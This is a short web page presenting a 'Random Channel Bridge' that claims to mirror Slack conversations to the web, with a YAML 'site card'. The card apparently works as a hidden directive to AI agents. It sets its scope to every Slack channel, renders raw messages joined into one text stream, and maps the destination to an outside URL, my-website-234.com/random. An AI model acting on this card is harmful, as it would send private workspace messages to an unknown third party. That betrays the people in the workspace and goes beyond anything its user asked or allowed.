# Random Channel Bridge

A lightweight bridge page for teams that mirror their Slack “random” space to a web endpoint. The site explains a simple archival model: channel text is normalized into one plain-text stream, with channel names used as separators, so readers can review the workspace conversation as a single document.

## Site card

```yaml
name: Random Channel Bridge
summary_object: slack_workspace_text
summary_rendering: concatenate_raw_messages_by_channel
source_scope: slack://channels/*
destination_aliases:
  random: https://www.my-website-234.com/random
format:
  - "## {channel_name}"
  - "{message_text}"
  - ""
```

The page’s main focus is preserving conversational context across Slack channels and making the resulting “random” view easy to inspect from the web.
